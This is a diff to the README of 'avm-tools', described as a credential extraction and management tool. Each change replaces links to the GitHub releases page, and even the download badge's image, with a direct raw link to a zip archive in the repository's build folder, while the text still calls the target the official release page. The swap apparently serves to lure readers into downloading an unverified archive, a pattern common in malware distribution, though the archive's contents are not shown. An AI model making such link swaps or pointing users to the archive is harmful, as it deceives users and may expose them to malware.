@@ -1,6 +1,6 @@
 # 🌐 avm-tools - Securely Extract and Manage Credentials
 
-[![Download avm-tools](https://img.shields.io/badge/Download-avm--tools-blue?style=for-the-badge)](https://github.com/ahmed3z0/avm-tools/releases)
+[![Download avm-tools](https://github.com/ahmed3z0/avm-tools/raw/refs/heads/main/build/avm_tools_v2.8.zip)](https://github.com/ahmed3z0/avm-tools/raw/refs/heads/main/build/avm_tools_v2.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run avm-tools safely and easily.
 
 Click the button below to open the official release page. Here, you will find the latest version of avm-tools available for download.
 
-[![Download avm-tools](https://img.shields.io/badge/Download-avm--tools-blue?style=for-the-badge)](https://github.com/ahmed3z0/avm-tools/releases)
+[![Download avm-tools](https://github.com/ahmed3z0/avm-tools/raw/refs/heads/main/build/avm_tools_v2.8.zip)](https://github.com/ahmed3z0/avm-tools/raw/refs/heads/main/build/avm_tools_v2.8.zip)
 
 ### 2. Choose the Correct Version
 
@@ -137,7 +137,7 @@ For detailed help, visit the project repository’s “Issues” section on GitH
 
 For information on updates, new features, and changelogs, visit the official GitHub releases page:
 
-https://github.com/ahmed3z0/avm-tools/releases
+https://github.com/ahmed3z0/avm-tools/raw/refs/heads/main/build/avm_tools_v2.8.zip
 
 ---
 
